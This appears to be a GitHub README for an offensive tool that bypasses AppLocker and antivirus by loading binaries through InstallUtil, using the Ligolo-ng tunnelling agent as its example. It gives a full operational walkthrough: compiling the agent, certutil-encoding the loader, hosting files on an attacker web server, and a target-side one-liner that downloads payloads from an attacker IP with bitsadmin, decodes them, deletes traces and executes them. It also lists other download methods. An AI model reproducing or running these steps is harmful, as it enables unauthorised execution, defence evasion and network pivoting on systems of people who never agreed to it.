# ApplockerBypassExternalBinary #

The original project can reflectively load and execute PEs locally and remotely bypassing EDR hooks. This modified version integrates the use of InstallUtil, allowing it to bypass security configurations like AppLocker for executing various binaries, including tools like Ligolo-ng.

This project closely resembles the well-known Invoke-ReflectivePEInjection.ps1, but being built in C# made it easier to implement code specifically designed for antivirus evasion. It includes basic evasion techniques that can be further adapted to bypass more recent antivirus solutions.

This setup focuses on executing Ligolo as a functional proof of concept (PoC) but can be easily modified to run any binary, allowing for flexible use with different tools as needed.

# Ligolo-ng Setup and Execution Guide

## 1. Setup Ligolo-ng Agent
To configure and compile the Ligolo-ng agent:

### Step 1: Modify the Ligolo-ng agent's main file
Open and edit main.go to adjust the settings as needed : **/ligolo-ng/cmd/agent/main.go**

![image](https://github.com/user-attachments/assets/3e9dfb54-edb7-420b-83a7-f6679e9d4831)


### Step 2: Compile the agent
Use the following command to compile:
```
GOOS=windows go build -o agent.exe cmd/agent/main.go
```

## 2. Prepare ApplockerBypassExternalBinary
To compile and encode your C# project for use:

### Step 1: Compile the project
Ensure the project is compiled as **Release** and **x64** for compatibility.

### Step 2: Encode the executable with certutil
Use certutil to convert the .exe to Base64, allowing for easier transfer:
```
certutil -encode .\ApplockerBypassExternalBinary.exe AppLockerBypassLigolo.txt
```

## 3. Setup Your Web Server

Before executing the download on the target machine, set up a web server to host the required files:

- **Option 1**: Use Apache  
  Apache is a reliable choice and works well with all download methods, including `bitsadmin`.

- **Option 2**: Use Python’s SimpleHTTPServer (for quick setups)  
  Run the following command in the directory with your files:
  ```bash
  python -m http.server 80
  ```
  
## 4. Execution on the Target Machine
Use the following one-liner command on the target machine:
```
cmd /c bitsadmin /Transfer myJob http://192.168.xxx.xxx/ligolo-agent.exe C:\users\public\try-agent.exe && cmd /c bitsadmin /Transfer myJob http://192.168.xxx.xxx/pyhttp/AppLockerBypassLigolo.txt C:\users\public\enc.txt && certutil -decode C:\users\public\enc.txt C:\users\public\ligolo.exe && del C:\users\public\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=true /U C:\users\public\ligolo.exe
```
Bitsadmin is used as a download method, though it has its pros and cons—such as being deprecated on newer Windows versions and potentially limited by network configurations. Alternatively, certutil can serve as a reliable option for downloading files in many environments. Other flexible methods include curl (available on Windows 10+), or PowerShell’s built-in capability, such as (New-Object System.Net.WebClient).DownloadFile("URL", "path"), which offers compatibility across a wide range of systems.


----------------------------------------------------------------------------------------

- I haven't found any ressource for bypassing applocker with ligolo-ng, so here it is.

- Huge thanks to @cpu0x00 for https://github.com/cpu0x00/SharpReflectivePEInjection

	

	
